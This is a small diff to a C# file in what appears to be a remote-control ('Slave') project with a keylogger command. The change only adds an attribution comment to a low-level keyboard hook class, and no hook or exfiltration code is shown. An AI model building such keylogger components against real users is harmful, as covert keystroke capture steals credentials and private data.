@@ -5,7 +5,8 @@ using System.Runtime.InteropServices;
 namespace Slave.Commands.KeyLogger
 {
     /// <summary>
-    /// Class for intercepting low level keyboard hooks
+    /// Class for intercepting low level keyboard hooks,
+    /// taken from https://github.com/rvknth043/Global-Low-Level-Key-Board-And-Mouse-Hook
     /// </summary>
     internal class KeyboardHook
     {
